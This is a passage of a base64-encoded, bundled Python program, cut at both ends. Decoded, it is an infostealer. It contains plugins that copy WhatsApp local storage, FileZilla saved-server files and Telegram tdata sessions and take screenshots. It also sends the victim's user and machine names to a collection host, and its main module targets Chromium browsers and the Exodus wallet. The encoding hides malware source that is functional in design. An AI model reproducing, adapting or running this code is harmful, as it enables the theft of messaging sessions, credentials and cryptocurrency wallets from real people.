vIHdoZW4gd2UgbmVlZFxuICAgICAgICAgICAgIyB0byBrbm93IHRoZSBpbmZvLCB3ZSBtdXN0IGxvYWQgdGhlIHRsYiBieSBmaWxlbmFtZSBhbmQgcmVxdWVzdCBpdC5cbiAgICAgICAgICAgICMgVGhlIFJlc29sdmUoKSBtZXRob2Qgb24gdGhlIFR5cGVsaWJTcGVjIGRvZXMgdGhpcy5cbiAgICAgICAgICAgICMgRm9yIHRoaXMgcmVhc29uLCBrZWVwIHRoZSB2ZXJzaW9uIG51bWJlcnMgYXMgc3RyaW5ncyAtIHRoYXRcbiAgICAgICAgICAgICMgd2F5IHdlIGNhblwndCBiZSB3cm9uZyEgIExldCBjb2RlIHRoYXQgcmVhbGx5IG5lZWRzIGFuIGludCB0byB3b3JrXG4gICAgICAgICAgICAjIG91dCB3aGF0IHRvIGRvLiAgRldJVywgaHR0cDovL3N1cHBvcnQubWljcm9zb2Z0LmNvbS9rYi84MTY5NzAgaXNcbiAgICAgICAgICAgICMgcHJldHR5IGNsZWFyIHRoYXQgdGhleSAqc2hvdWxkKiBiZSBoZXguXG4gICAgICAgICAgICBtYWpvciA9IG1ham9yX21pbm9yWzBdXG4gICAgICAgICAgICBtaW5vciA9IG1ham9yX21pbm9yWzFdXG4gICAgICAgICAgICBrZXkzID0gd2luMzJhcGkuUmVnT3BlbktleShrZXkyLCBzdHIodmVyc2lvbikpXG4gICAgICAgICAgICB0cnk6XG4gICAgICAgICAgICAgICAgIyBUaGUgIkZMQUdTIiBhcmUgYXQgdGhpcyBwb2ludFxuICAgICAgICAgICAgICAgIGZsYWdzID0gaW50KHdpbjMyYXBpLlJlZ1F1ZXJ5VmFsdWUoa2V5MywgIkZMQUdTIikpXG4gICAgICAgICAgICBleGNlcHQgKHdpbjMyYXBpLmVycm9yLCBWYWx1ZUVycm9yKTpcbiAgICAgICAgICAgICAgICBmbGFncyA9IDBcbiAgICAgICAgICAgIGlmIGZsYWdzICYgZXhjbHVkZUZsYWdzID09IDA6XG4gICAgICAgICAgICAgICAgZm9yIGxjaWQsIGNyYXAgaW4gRW51bUtleXMoa2V5Myk6XG4gICAgICAgICAgICAgICAgICAgIHRyeTpcbiAgICAgICAgICAgICAgICAgICAgICAgIGxjaWQgPSBpbnQobGNpZClcbiAgICAgICAgICAgICAgICAgICAgZXhjZXB0IFZhbHVlRXJyb3I6ICAjIG5vdCBhbiBMQ0lEIGVudHJ5XG4gICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZVxuICAgICAgICAgICAgICAgICAgICAjIENoZWNrIGZvciBib3RoICJ7bGNpZH1cXHdpbjMyIiBhbmQgIntsY2lkfVxcd2luNjQiIGtleXMuXG4gICAgICAgICAgICAgICAgICAgIHRyeTpcbiAgICAgICAgICAgICAgICAgICAgICAgIGtleTQgPSB3aW4zMmFwaS5SZWdPcGVuS2V5KGtleTMsICIlc1xcXFx3aW4zMiIgJSAobGNpZCwpKVxuICAgICAgICAgICAgICAgICAgICBleGNlcHQgd2luMzJhcGkuZXJyb3I6XG4gICAgICAgICAgICAgICAgICAgICAgICB0cnk6XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAga2V5NCA9IHdpbjMyYXBpLlJlZ09wZW5LZXkoa2V5MywgIiVzXFxcXHdpbjY0IiAlIChsY2lkLCkpXG4gICAgICAgICAgICAgICAgICAgICAgICBleGNlcHQgd2luMzJhcGkuZXJyb3I6XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWVcbiAgICAgICAgICAgICAgICAgICAgdHJ5OlxuICAgICAgICAgICAgICAgICAgICAgICAgZGxsLCB0eXAgPSB3aW4zMmFwaS5SZWdRdWVyeVZhbHVlRXgoa2V5NCwgTm9uZSlcbiAgICAgICAgICAgICAgICAgICAgICAgIGlmIHR5cCA9PSB3aW4zMmNvbi5SRUdfRVhQQU5EX1NaOlxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRsbCA9IHdpbjMyYXBpLkV4cGFuZEVudmlyb25tZW50U3RyaW5ncyhkbGwpXG4gICAgICAgICAgICAgICAgICAgIGV4Y2VwdCB3aW4zMmFwaS5lcnJvcjpcbiAgICAgICAgICAgICAgICAgICAgICAgIGRsbCA9IE5vbmVcbiAgICAgICAgICAgICAgICAgICAgc3BlYyA9IFR5cGVsaWJTcGVjKGlpZCwgbGNpZCwgbWFqb3IsIG1pbm9yLCBmbGFncylcbiAgICAgICAgICAgICAgICAgICAgc3BlYy5kbGwgPSBkbGxcbiAgICAgICAgICAgICAgICAgICAgc3BlYy5kZXNjID0gdGxiZGVzY1xuICAgICAgICAgICAgICAgICAgICBzcGVjLnZlcl9kZXNjID0gdGxiZGVzYyArICIgKCIgKyB2ZXJzaW9uICsgIikiXG4gICAgICAgICAgICAgICAgICAgIHJlc3VsdHMuYXBwZW5kKHNwZWMpXG4gICAgcmV0dXJuIHJlc3VsdHNcblxuXG5kZWYgRmluZFRsYnNXaXRoRGVzY3JpcHRpb24oZGVzYyk6XG4gICAgIiIiRmluZCBhbGwgaW5zdGFsbGVkIHR5cGUgbGlicmFyaWVzIHdpdGggdGhlIHNwZWNpZmllZCBkZXNjcmlwdGlvbiIiIlxuICAgIHJldCA9IFtdXG4gICAgaXRlbXMgPSBFbnVtVGxicygpXG4gICAgZm9yIGl0ZW0gaW4gaXRlbXM6XG4gICAgICAgIGlmIGl0ZW0uZGVzYyA9PSBkZXNjOlxuICAgICAgICAgICAgcmV0LmFwcGVuZChpdGVtKVxuICAgIHJldHVybiByZXRcblxuXG5kZWYgU2VsZWN0VGxiKHRpdGxlPSJTZWxlY3QgTGlicmFyeSIsIGV4Y2x1ZGVGbGFncz0wKTpcbiAgICAiIiJEaXNwbGF5IGEgbGlzdCBvZiBhbGwgdGhlIHR5cGUgbGlicmFyaWVzLCBhbmQgc2VsZWN0IG9uZS4gICBSZXR1cm5zIE5vbmUgaWYgY2FuY2VsbGVkIiIiXG4gICAgaW1wb3J0IHB5d2luLmRpYWxvZ3MubGlzdFxuXG4gICAgaXRlbXMgPSBFbnVtVGxicyhleGNsdWRlRmxhZ3MpXG4gICAgIyBmaXh1cCB2ZXJzaW9ucyAtIHdlIGFzc3VtZSBoZXggKHNlZSBfX2luaXRfXyBhYm92ZSlcbiAgICBmb3IgaSBpbiBpdGVtczpcbiAgICAgICAgaS5tYWpvciA9IGludChpLm1ham9yLCAxNilcbiAgICAgICAgaS5taW5vciA9IGludChpLm1pbm9yLCAxNilcbiAgICBpdGVtcy5zb3J0KClcbiAgICByYyA9IHB5d2luLmRpYWxvZ3MubGlzdC5TZWxlY3RGcm9tTGlzdHModGl0bGUsIGl0ZW1zLCBbIlR5cGUgTGlicmFyeSJdKVxuICAgIGlmIHJjIGlzIE5vbmU6XG4gICAgICAgIHJldHVybiBOb25lXG4gICAgcmV0dXJuIGl0ZW1zW3JjXVxuXG5cbiMgVGVzdCBjb2RlLlxuaWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIjpcbiAgICBwcmludChTZWxlY3RUbGIoKS5fX2RpY3RfXylcbicpCiAgICBfX3N0aWNreXRhcGVfd3JpdGVfbW9kdWxlKCdwbHVnaW5zL3doYXRzYXBwLnB5JywgYiJmcm9tIHBsdWdpbnMgaW1wb3J0IFBsdWdpblxyXG5mcm9tIGNvbmZpZyBpbXBvcnQgQ29uZmlnXHJcbmZyb20gb3MucGF0aCBpbXBvcnQgaXNkaXIsIGpvaW5cclxuZnJvbSBvcyBpbXBvcnQgbWtkaXIsIHNjYW5kaXJcclxuZnJvbSBzZWNyZXRzIGltcG9ydCB0b2tlbl9oZXhcclxuZnJvbSB0b29scyBpbXBvcnQgY29weXRyZWVcclxuXHJcblxyXG5cclxuY2xhc3MgV2hhdHNhcHAoUGx1Z2luKTpcclxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCBjb25mOiBDb25maWcpIC0+IE5vbmU6XHJcbiAgICAgICAgc2VsZi5jb25mID0gY29uZlxyXG5cclxuXHJcbiAgICBhc3luYyBkZWYgY2FsbGJhY2soc2VsZiwgcGF0aDogc3RyKSAtPiBOb25lOlxyXG4gICAgICAgIGlmIG5vdCBpc2RpcihwYXRoKTpcclxuICAgICAgICAgICAgcmV0dXJuXHJcblxyXG4gICAgICAgIGZvbGRlciA9IGpvaW4ocGF0aCwgJ2xvY2FsIHN0b3JhZ2UnLCAnbGV2ZWxkYicpXHJcblxyXG4gICAgICAgIGlmIG5vdCBpc2Rpcihmb2xkZXIpOlxyXG4gICAgICAgICAgICByZXR1cm5cclxuICAgICAgICBcclxuICAgICAgICB3aGF0c2FwcF9yZXNfZm9sZGVyID0gam9pbihzZWxmLmNvbmYubG9nX3BhdGgsICd3aGF0c2FwcCcpXHJcblxyXG4gICAgICAgIGlmIG5vdCBpc2Rpcih3aGF0c2FwcF9yZXNfZm9sZGVyKTpcclxuICAgICAgICAgICAgbWtkaXIod2hhdHNhcHBfcmVzX2ZvbGRlcilcclxuXHJcbiAgICAgICAgcmVzID0gam9pbih3aGF0c2FwcF9yZXNfZm9sZGVyLCBmJ3doYXRzYXBwX3t0b2tlbl9oZXgoNCl9JylcclxuXHJcbiAgICAgICAgYXdhaXQgY29weXRyZWUoZm9sZGVyLCByZXMpXHJcblxyXG4gICAgICAgIGF3YWl0IHNlbGYuY29uZi5sb2dnZXIubG9nKGYnV2hhdHNhcHAgc3RlYWxlZCBmcm9tIHtwYXRofScpIikKICAgIF9fc3RpY2t5dGFwZV93cml0ZV9tb2R1bGUoJ3BsdWdpbnMvRGV0YWlscy5weScsIGIiZnJvbSBhc3luY2lvIGltcG9ydCBjcmVhdGVfdGFza1xyXG5mcm9tIGNvbmZpZyBpbXBvcnQgQ29uZmlnXHJcbmltcG9ydCBvc1xyXG5mcm9tIG9zLnBhdGggaW1wb3J0IGpvaW5cclxuaW1wb3J0IHBsYXRmb3JtXHJcbmZyb20gYWlvZmlsZXMgaW1wb3J0IG9wZW5cclxuZnJvbSBtc3Mud2luZG93cyBpbXBvcnQgTVNTIGFzIG1zc1xyXG5mcm9tIHRvb2xzIGltcG9ydCBtb3ZlXHJcblxyXG5cclxuXHJcbmNsYXNzIERldGFpbHMoKTpcclxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCBjb25mOiBDb25maWcpIC0+IE5vbmU6XHJcbiAgICAgICAgc2VsZi5jb25mID0gY29uZlxyXG5cclxuICAgIGFzeW5jIGRlZiB0YWtlX3NjcmVlbnNob3Qoc2VsZikgLT4gTm9uZTpcclxuICAgICAgICB3aXRoIG1zcygpIGFzIHNjdDpcclxuICAgICAgICAgICAgZm9yIGZpbGVuYW1lIGluIHNjdC5zYXZlKCk6XHJcbiAgICAgICAgICAgICAgICBhd2FpdCBtb3ZlKGZpbGVuYW1lLCBqb2luKHNlbGYuY29uZi5sb2dfcGF0aCwgZmlsZW5hbWUpKVxyXG4gICAgICAgICAgICAgICAgYXdhaXQgc2VsZi5jb25mLmxvZ2dlci5sb2coZidceGQwXHhhMVx4ZDBceGJhXHhkMVx4ODBceGQwXHhiOFx4ZDBceGJkXHhkMVx4ODhceGQwXHhiZVx4ZDFceDgyIHtmaWxlbmFtZX0gXHhkMVx4ODFceGQwXHhiZVx4ZDFceDg1XHhkMVx4ODBceGQwXHhiMFx4ZDBceGJkXHhkMFx4YjVceGQwXHhiZCcpXHJcbiBcclxuICAgIGFzeW5jIGRlZiBjYWxsYmFjayhzZWxmKSAtPiBOb25lOlxyXG4gICAgICAgIGJnX3Rhc2sgPSBjcmVhdGVfdGFzayhzZWxmLnRha2Vfc2NyZWVuc2hvdCgpKVxyXG4gICAgICAgIHVzZXIgPSBvcy5nZXRsb2dpbigpXHJcbiAgICAgICAgcGMgPSBwbGF0Zm9ybS5ub2RlKClcclxuICAgICAgICB0YWcgPSBzZWxmLmNvbmYudGFnXHJcblxyXG4gICAgICAgIGRhdGEgPSB7XHJcbiAgICAgICAgICAgICdjbGllbnRfaWQnOiBzZWxmLmNvbmYuY2xpZW50X2lkLFxyXG4gICAgICAgICAgICAndGFnJzogdGFnLFxyXG4gICAgICAgICAgICAndXNlcl9uYW1lJzogdXNlcixcclxuICAgICAgICAgICAgJ3BjX25hbWUnOiBwY1xyXG4gICAgICAgIH1cclxuICAgICAgICBcclxuICAgICAgICB1cmwgPSBmJ3tzZWxmLmNvbmYuaG9zdH0vcmVjZWl2ZV9kZXRhaWxzJ1xyXG5cclxuICAgICAgICByZXNwID0gYXdhaXQgc2VsZi5jb25mLnNlc3Npb24ucG9zdCh1cmwsIGpzb249ZGF0YSlcclxuXHJcbiAgICAgICAgYXN5bmMgd2l0aCBvcGVuKGpvaW4oc2VsZi5jb25mLmxvZ19wYXRoLCAnZGV0YWlscy50eHQnKSwgJ3cnLCBlbmNvZGluZz0ndXRmOCcpIGFzIGY6XHJcbiAgICAgICAgICAgIGF3YWl0IGYud3JpdGUoZid1c2VyIG5hbWU6IHt1c2VyfVxcbnBjIG5hbWU6IHtwY31cXG50YWc6IHt0YWd9JylcclxuXHJcbiAgICAgICAgYXdhaXQgc2VsZi5jb25mLmxvZ2dlci5sb2coZidceGQwXHg5ZVx4ZDFceDgyXHhkMVx4ODFceGQxXHg4Mlx4ZDFceDgzXHhkMFx4YmEgXHhkMFx4YmVceGQxXHg4Mlx4ZDBceGJmXHhkMVx4ODBceGQwXHhiMFx4ZDBceGIyXHhkMFx4YmJceGQwXHhiNVx4ZDBceGJkJylcclxuXHJcbiAgICAgICAgYXdhaXQgYmdfdGFzayIpCiAgICBfX3N0aWNreXRhcGVfd3JpdGVfbW9kdWxlKCdwbHVnaW5zL0ZpbGV6aWxsYS5weScsIGIiZnJvbSBwbHVnaW5zIGltcG9ydCBQbHVnaW5cclxuZnJvbSBjb25maWcgaW1wb3J0IENvbmZpZ1xyXG5mcm9tIG9zLnBhdGggaW1wb3J0IGlzZGlyLCBqb2luXHJcbmZyb20gb3MgaW1wb3J0IG1rZGlyLCBzY2FuZGlyXHJcbmZyb20gc2VjcmV0cyBpbXBvcnQgdG9rZW5faGV4XHJcbmZyb20gdG9vbHMgaW1wb3J0IGNvcHlmaWxlXHJcblxyXG5cclxuXHJcbmNsYXNzIEZpbGV6aWxsYShQbHVnaW4pOlxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIGNvbmY6IENvbmZpZykgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLmNvbmYgPSBjb25mXHJcblxyXG5cclxuICAgIGFzeW5jIGRlZiBjYWxsYmFjayhzZWxmLCBwYXRoOiBzdHIpIC0+IE5vbmU6XHJcbiAgICAgICAgaWYgbm90IGlzZGlyKHBhdGgpOlxyXG4gICAgICAgICAgICByZXR1cm5cclxuXHJcbiAgICAgICAgc2VhcmNoID0geydyZWNlbnRzZXJ2ZXJzLnhtbCcsICdzaXRlbWFuYWdlci54bWwnfVxyXG4gICAgICAgIGZpbGVzID0gc2VhcmNoLmludGVyc2VjdGlvbihpLm5hbWUgZm9yIGkgaW4gc2NhbmRpcihwYXRoKSlcclxuXHJcbiAgICAgICAgaWYgbm90IGZpbGVzOlxyXG4gICAgICAgICAgICByZXR1cm5cclxuXHJcbiAgICAgICAgcmVzX3BhdGggPSBqb2luKHNlbGYuY29uZi5sb2dfcGF0aCwgJ2ZpbGV6aWxsYScpXHJcbiAgICAgICAgaWYgbm90IGlzZGlyKHJlc19wYXRoKTpcclxuICAgICAgICAgICAgbWtkaXIocmVzX3BhdGgpXHJcbiAgICAgICAgXHJcbiAgICAgICAgZm9yIGYgaW4gZmlsZXM6XHJcbiAgICAgICAgICAgIGZpbGVuYW1lID0gZi5zcGxpdCgnLicpWzBdXHJcbiAgICAgICAgICAgIGRlc3RfcGF0aCA9IGpvaW4ocmVzX3BhdGgsIGYne2ZpbGVuYW1lfV97dG9rZW5faGV4KDQpfS54bWwnKVxyXG4gICAgICAgICAgICBhd2FpdCBjb3B5ZmlsZShqb2luKHBhdGgsIGYpLCBkZXN0X3BhdGgpXHJcblxyXG4gICAgICAgIGF3YWl0IHNlbGYuY29uZi5sb2dnZXIubG9nKGYnRmlsZXppbGxhIHN0ZWFsZWQgZnJvbSB7cGF0aH0nKSIpCiAgICBfX3N0aWNreXRhcGVfd3JpdGVfbW9kdWxlKCdwbHVnaW5zL1RlbGVncmFtLnB5JywgYidmcm9tIHBsdWdpbnMgaW1wb3J0IFBsdWdpblxyXG5mcm9tIGNvbmZpZyBpbXBvcnQgQ29uZmlnXHJcbmZyb20gb3MucGF0aCBpbXBvcnQgaXNkaXIsIGpvaW4sIG5vcm1wYXRoXHJcbmZyb20gb3MgaW1wb3J0IG1rZGlyLCBzY2FuZGlyXHJcbmZyb20gc2VjcmV0cyBpbXBvcnQgdG9rZW5faGV4XHJcbmZyb20gdG9vbHMgaW1wb3J0IGNvcHlmaWxlLCBjb3B5dHJlZVxyXG5pbXBvcnQgd2lucmVnXHJcbmltcG9ydCByZVxyXG5mcm9tIHBhdGhzIGltcG9ydCBMT0NBTFxyXG5pbXBvcnQgd2luMzJjb20uY2xpZW50XHJcbmltcG9ydCBwc3V0aWxcclxuZnJvbSBvcy5wYXRoIGltcG9ydCBzcGxpdFxyXG5cclxuXHJcblxyXG5jbGFzcyBUZWxlZ3JhbShQbHVnaW4pOlxyXG4gICAgU1RFQUxFRCA9IHNldCgpXHJcblxyXG5cclxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCBjb25mOiBDb25maWcpIC0+IE5vbmU6XHJcbiAgICAgICAgc2VsZi5jb25mID0gY29uZlxyXG5cclxuICAgIGFzeW5jIGRlZiBjYWxsYmFjayhzZWxmLCBwYXRoOiBzdHIpIC0+IE5vbmU6XHJcbiAgICAgICAgcGF0aF8gPSBub3JtcGF0aChwYXRoLmxvd2VyKCkpXHJcbiAgICAgICAgaWYgcGF0aF8gaW4gVGVsZWdyYW0uU1RFQUxFRDpcclxuICAgICAgICAgICAgcmV0dXJuXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgVGVsZWdyYW0uU1RFQUxFRC5hZGQocGF0aF8pXHJcbiAgICAgICAgXHJcbiAgICAgICAgaWYgbm90IGlzZGlyKHBhdGgpOlxyXG4gICAgICAgICAgICByZXR1cm5cclxuXHJcbiAgICAgICAgdGRhdGFfcGF0aCA9IGpvaW4ocGF0aCwgXCd0ZGF0YVwnKVxyXG4gICAgICAgIGlmIG5vdCBpc2Rpcih0ZGF0YV9wYXRoKTpcclxuICAgICAgICAgICAgcmV0dXJuXHJcblxyXG4gICAgICAgIHRlbGVncmFtX3BhdGggPSBqb2luKHNlbGYuY29uZi5sb2dfcGF0aCwgXCd0ZWxlZ3JhbVwnKVxyXG4gICAgICAgIGlmIG5vdCBpc2Rpcih0ZWxlZ3JhbV9wYXRoKTpcclxuICAgICAgICAgICAgbWtkaXIodGVsZWdyYW1fcGF0aClcclxuXHJcbiAgICAgICAgcmVzX3BhdGggPSBqb2luKHRlbGVncmFtX3BhdGgsIGZcJ3RkYXRhX3t0b2tlbl9oZXgoNCl9XCcpXHJcbiAgICAgICAgbWtkaXIocmVzX3BhdGgpXHJcblxyXG4gICAgICAgIGJsYWNrbGlzdCA9IFtcJ2R1bXBzXCcsIFwnZW1vamlcJywgXCd1c2VyX2RhdGFcJywgXCd3b3JraW5nXCddXHJcblxyXG4gICAgICAgIGZvciBmIGluIHNjYW5kaXIodGRhdGFfcGF0aCk6XHJcbiAgICAgICAgICAgIGZpbGVfb2sgPSBUcnVlXHJcbiAgICAgICAgICAgIGZvciBpIGluIGJsYWNrbGlzdDpcclxuICAgICAgICAgICAgICAgIGlmIGkgaW4gZi5uYW1lOlxyXG4gICAgICAgICAgICAgICAgICAgIGZpbGVfb2sgPSBGYWxzZVxyXG4gICAgICAgICAgICAgICAgICAgIGJyZWFrXHJcbiAgICAgICAgICAgIFxyXG4gICAgICAgICAgICBpZiBub3QgZmlsZV9vazpcclxuICAgICAgICAgICAgICAgIGNvbnRpbnVlXHJcbiAgICAgICAgICAgIFxyXG4gICAgICAgICAgICBmcm9tX3BhdGggPSBqb2luKHRkYXRhX3BhdGgsIGYubmFtZSlcclxuICAgICAgICAgICAgZGVzdF9wYXRoID0gam9pbihyZXNfcGF0aCwgZi5uYW1lKVxyXG5cclxuICAgICAgICAgICAgZnVuYyA9IGNvcHlmaWxlIGlmIGYuaXNfZmlsZSgpIGVsc2UgY29weXRyZWVcclxuICAgICAgICAgICAgYXdhaXQgZnVuYyhmcm9tX3BhdGgsIGRlc3RfcGF0aClcclxuXHJcbiAgICAgICAgYXdhaXQgc2VsZi5jb25mLmxvZ2dlci5sb2coZlwnVGVsZWdyYW0gc3RlYWxlZCBmcm9tIHtwYXRofVwnKVxyXG5cclxuICAgIEBzdGF0aWNtZXRob2RcclxuICAgIGRlZiBnZXRfcmVnaXN0cnlfcGF0aCgpOlxyXG4gICAgICAgIHBhdGggPSB3aW5yZWcuSEtFWV9DTEFTU0VTX1JPT1RcclxuXHJcbiAgICAgICAgdGcgPSB3aW5yZWcuT3BlbktleUV4KHBhdGgsIHIidGRlc2t0b3AudGdcXFxcIilcclxuICAgICAgICBzaGVsbCA9IHdpbnJlZy5PcGVuS2V5RXgodGcsIHJcJ3NoZWxsXFxcXFwnKVxyXG4gICAgICAgIG9wZW5fcmcgPSB3aW5yZWcuT3BlbktleUV4KHNoZWxsLCByXCdvcGVuXFxcXFwnKVxyXG4gICAgICAgIGtleSA9IHdpbnJlZy5PcGVuS2V5RXgob3Blbl9yZywgclwnY29tbWFuZFxcXFxcJylcclxuXHJcbiAgICAgICAgdmFsdWUgPSB3aW5yZWcuRW51bVZhbHVlKGtleSwgMClcclxuXHJcbiAgICAgICAgcGF0aCA9IHJlLmZpbmRhbGwoclwnIihbXiJdKilcJywgdmFsdWVbMV0pWzJdXHJcbiAgICAgICAgcmV0dXJuIHBhdGhcclxuICAgICAgICBcclxuICAgIEBzdGF0aWNtZXRob2RcclxuICAgIGRlZiBnZXRfbG5rX3BhdGgoKTpcclxuICAgICAgICBkZXNrdG9wID0gam9pbihMT0NBTCwgXCdkZXNrdG9wXCcpXHJcblxyXG4gICAgICAgIGZvciBpdCBpbiBzY2FuZGlyKGRlc2t0b3ApOlxyXG4gICAgICAgICAgICBpZiBpdC5uYW1lLnNwbGl0KFwnLlwnKVstMV0gPT0gXCdsbmtcJyBhbmQgXCd0ZWxlZ3JhbVwnIGluIGl0Lm5hbWUubG93ZXIoKTpcclxuICAgICAgICAgICAgICAgIHNoZWxsID0gd2luMzJjb20uY2xpZW50LkRpc3BhdGNoKCJXU2NyaXB0LlNoZWxsIilcclxuICAgICAgICAgICAgICAgIHNob3J0Y3V0ID0gc2hlbGwuQ3JlYXRlU2hvcnRDdXQoaXQucGF0aClcclxuICAgICAgICAgICAgICAgIHBhdGggPSBzaG9ydGN1dC5UYXJnZXRwYXRoLmxvd2VyKCkuc3RyaXAoXCd0ZWxlZ3JhbS5leGVcJylcclxuICAgICAgICAgICAgICAgIHJldHVybiBwYXRoXHJcblxyXG4gICAgQHN0YXRpY21ldGhvZFxyXG4gICAgZGVmIGdldF90ZWxlZ3JhbXMoKTpcclxuICAgICAgICBmb3IgcHJvYyBpbiBwc3V0aWwucHJvY2Vzc19pdGVyKCk6XHJcbiAgICAgICAgICAgIGlmIFwndGVsZWdyYW1cJyBpbiBwcm9jLm5hbWUoKS5sb3dlcigpOlxyXG4gICAgICAgICAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICAgICAgICAgIHlpZWxkIHNwbGl0KHByb2MuZXhlKCkpWzBdXHJcbiAgICAgICAgICAgICAgICBleGNlcHQ6XHJcbiAgICAgICAgICAgICAgICAgICAgcGFzcycpCiAgICBfX3N0aWNreXRhcGVfd3JpdGVfbW9kdWxlKCdwbHVnaW5zL1doYXRzYXBwLnB5JywgYiJmcm9tIHBsdWdpbnMgaW1wb3J0IFBsdWdpblxyXG5mcm9tIGNvbmZpZyBpbXBvcnQgQ29uZmlnXHJcbmZyb20gb3MucGF0aCBpbXBvcnQgaXNkaXIsIGpvaW5cclxuZnJvbSBvcyBpbXBvcnQgbWtkaXIsIHNjYW5kaXJcclxuZnJvbSBzZWNyZXRzIGltcG9ydCB0b2tlbl9oZXhcclxuZnJvbSB0b29scyBpbXBvcnQgY29weXRyZWVcclxuXHJcblxyXG5cclxuY2xhc3MgV2hhdHNhcHAoUGx1Z2luKTpcclxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCBjb25mOiBDb25maWcpIC0+IE5vbmU6XHJcbiAgICAgICAgc2VsZi5jb25mID0gY29uZlxyXG5cclxuXHJcbiAgICBhc3luYyBkZWYgY2FsbGJhY2soc2VsZiwgcGF0aDogc3RyKSAtPiBOb25lOlxyXG4gICAgICAgIGlmIG5vdCBpc2RpcihwYXRoKTpcclxuICAgICAgICAgICAgcmV0dXJuXHJcblxyXG4gICAgICAgIGZvbGRlciA9IGpvaW4ocGF0aCwgJ2xvY2FsIHN0b3JhZ2UnLCAnbGV2ZWxkYicpXHJcblxyXG4gICAgICAgIGlmIG5vdCBpc2Rpcihmb2xkZXIpOlxyXG4gICAgICAgICAgICByZXR1cm5cclxuICAgICAgICBcclxuICAgICAgICB3aGF0c2FwcF9yZXNfZm9sZGVyID0gam9pbihzZWxmLmNvbmYubG9nX3BhdGgsICd3aGF0c2FwcCcpXHJcblxyXG4gICAgICAgIGlmIG5vdCBpc2Rpcih3aGF0c2FwcF9yZXNfZm9sZGVyKTpcclxuICAgICAgICAgICAgbWtkaXIod2hhdHNhcHBfcmVzX2ZvbGRlcilcclxuXHJcbiAgICAgICAgcmVzID0gam9pbih3aGF0c2FwcF9yZXNfZm9sZGVyLCBmJ3doYXRzYXBwX3t0b2tlbl9oZXgoNCl9JylcclxuXHJcbiAgICAgICAgYXdhaXQgY29weXRyZWUoZm9sZGVyLCByZXMpXHJcblxyXG4gICAgICAgIGF3YWl0IHNlbGYuY29uZi5sb2dnZXIubG9nKGYnV2hhdHNhcHAgc3RlYWxlZCBmcm9tIHtwYXRofScpIikKICAgIGltcG9ydCBhc3luY2lvCiAgICBmcm9tIGFzeW5jaW8gaW1wb3J0IGNyZWF0ZV90YXNrCiAgICBmcm9tIHR5cGluZyBpbXBvcnQgTGlzdAogICAgZnJvbSBwYXRoX3NlYXJjaCBpbXBvcnQgc2VhcmNoX3BsdWdpbl9wYXRocywgcm9vdF9wYXRocwogICAgZnJvbSBjb25maWcgaW1wb3J0IENvbmZpZwogICAgZnJvbSBhaW9odHRwIGltcG9ydCBDbGllbnRTZXNzaW9uIGFzIFNlc3Npb24KICAgIGltcG9ydCBzZWNyZXRzCiAgICBpbXBvcnQgdGltZWl0CiAgICBmcm9tIHBhdGhzIGltcG9ydCBURU1QCiAgICBmcm9tIG9zIGltcG9ydCBta2RpcgogICAgZnJvbSBvcy5wYXRoIGltcG9ydCBqb2luCiAgICBmcm9tIHppcGZpbGUgaW1wb3J0IFppcEZpbGUsIFpJUF9ERUZMQVRFRAogICAgZnJvbSB0b29scyBpbXBvcnQgemlwZGlyLCBfaGFuZGxlX3Rhc2tfcmVzdWx0CiAgICBmcm9tIGxvZ2dlciBpbXBvcnQgTG9nZ2VyCiAgICBmcm9tIG9zIGltcG9ydCBzY2FuZGlyCiAgICAKICAgIGZyb20gcGx1Z2lucyBpbXBvcnQgQ2hyb21pdW0sIERldGFpbHMsIEV4b2R1cywgRmlsZXppbGxhLCBUZWxlZ3JhbSwgV2hhdHNhcHAKICAgIAogICAgCiAgICAKICAgIEhPU1QgPSAnaHR0cDovLzEyNy4wLjAuMScKICAgIAogICAgCiAgICBhc3luYyBkZWYgbWFpbigpIC0+IE5vbmU6CiAgICAgICAgc3RhcnQgPSB0aW1laXQuZGVmYXVsdF90aW1lcigpCiAgICAKICAgICAgICBjbGllbnRfaWQgPSBzZWNyZXRzLnRva2VuX2hleCgxMCkKICAgICAgICBsb2dfcGF0aCA9IGpvaW4oVEVNUCwgY2xpZW50X2lkKQogICAgCiAgICAgICAgcHJpbnQobG9nX3BhdGgpCiAgICAgICAgbWtkaXIobG9nX3BhdGgpCiAgICAKICAgICAgICB0YXNrczogTGlzdFthc3luY2lvLlRhc2tdID0gW10KICAgIAogICAgICAgIHNlc3Npb24gPSBTZXNzaW9uKCkKICAgICAgICBsb2dnZXIgPSBMb2dnZXIobG9nX3BhdGgpCiAgICAgICAgY29uZiA9IENvbmZpZyhjbGllbnRfaWQsIEhPU1QsIGxvZ19wYXRoLCBsb2dnZXIsIHNlc3Npb24sIHRhZz0neHV5JykKICAgIAogICAgICAgIGF3YWl0IGxvZ2dlci5sb2coZidTdGFydCcpCiAgICAgICAgCiAgICAgICAgY2hyb21pdW0gPSBDaHJvbWl1bShjb25mKQogICAgICAgIHRlbGVncmFtID0gVGVsZWdyYW0oY29uZikKICAgIAogICAgICAgIHNlYXJjaF9mb2xkZXJfbmFtZXMgPSB7CiAgICAgICAgICAgICdnb29nbGUnOiBjaHJvbWl1bSwKICAgICAgICAgICAgJ2V4b2R1cyc6IEV4b2R1cyhjb25mKSwKICAgICAgICAgICAgJ21vemlsbGEnOiBOb25lLAogICAgICAgICAgICAndGVsZWdyYW0gZGVza3RvcCc6IHRlbGVncmFtLAogICAgICAgICAgICAndGVsZWdyYW0nOiBUZWxlZ3JhbShjb25mKSwKICAgICAgICAgICAgJ29wZXJhIHNvZnR3YXJlJzogY2hyb21pdW0sCiAgICAgICAgICAgICdmaWxlemlsbGEnOiBGaWxlemlsbGEoY29uZiksCiAgICAgICAgICAgICd3aGF0c2FwcCc6IFdoYXRzYXBwKGNvbmYpCiAgICAgICAgfQogICAgICAgIAogICAgICAgIHRhc2tzLmFwcGVuZChjcmVhdGVfdGFzayhzZWFyY2hfcGx1Z2luX3BhdGhzKH